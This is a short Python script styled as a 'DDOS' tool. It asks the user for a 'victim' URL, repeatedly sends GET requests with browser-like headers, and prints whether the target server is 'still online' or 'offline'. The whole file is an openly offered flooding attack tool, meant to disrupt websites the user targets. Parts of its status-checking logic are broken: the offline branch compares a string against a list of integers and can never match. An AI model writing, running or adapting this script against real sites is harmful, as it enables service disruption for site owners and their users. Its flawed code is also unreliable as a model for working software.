import time
import requests

print("\033[31m")
print("8888b.  8888b.   dP*Yb  .dP*Y8\n 8I  Yb  8I  Yb dP   Yb `Ybo.*\n 8I  dY  8I  dY Yb   dP o.`Y8b\n8888Y*  8888Y*   YbodP  8bodP'")
time.sleep(0.5)
print()
print("By Abner Cedric.")

headers = {
    "User-Agent": "Mozilla/5.0",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
    "Accept-Language": "en-US,en;q=0.5"
}
while True:
    print()
    time.sleep(0.3)
    alvo = input("who is the victim? (Ex: https://xxxxxxxx.com/) = ")
    try:
        tentativa = requests.get(alvo, headers=headers)
        resposta = tentativa.status_code
        resposta2 = str(resposta)
        erros = [400, 401, 403, 404, 405, 429, 500, 502, 503, 504]
        erros2 = str(erros)
        if resposta2 in erros2:
                print()
                for i in range(25):
                    print("=", end="", flush=True)
                    time.sleep(0.01)
                print()
                print()
                time.sleep(0.1)
                print("site is already having problems!")
                time.sleep(0.1)
                print()
                
                for i in range(25):
                    print("=", end="", flush=True)
                    time.sleep(0.01)        
                break
                
        else:
            time.sleep(0.1)
            print()              
            quantia = int(input("how many requests? = "))
            print() 
            for i in range(quantia):
                ataque = requests.get(alvo, headers=headers)
                time.sleep(0.1)
                status = ataque.status_code
                statusDDos = [503, 504, 429, 408]
                DDos = str(statusDDos)
                statusDDOS = str(status)
                if status == 200:
                    for i in range(28):                       
                        print("=", end="", flush=True)
                        time.sleep(0.01)
                    print()
                    time.sleep(0.1)
                    print("200 - server still online!")   
                    for i in range(28):
                        print("=", end="", flush=True)
                        time.sleep(0.01)
                    print()
                    print()
                        
                
                elif statusDDOS in statusDDos:
                        for i in range(28):
                            print("=", end="", flush=True)
                            time.sleep(0.01)
                        print()
                        time.sleep(0.1)
                        print(f"{statusDDOS} - server is offline!")
                        for i in range(28):
                            print("=", end="", flush=True)
                            time.sleep(0.01)
                        print()  
                        print()                                  
                
    except Exception as e:
        print("ERROR:", e)
        time.sleep(0.1)    
        print()
        time.sleep(0.1)
        print("try again!")            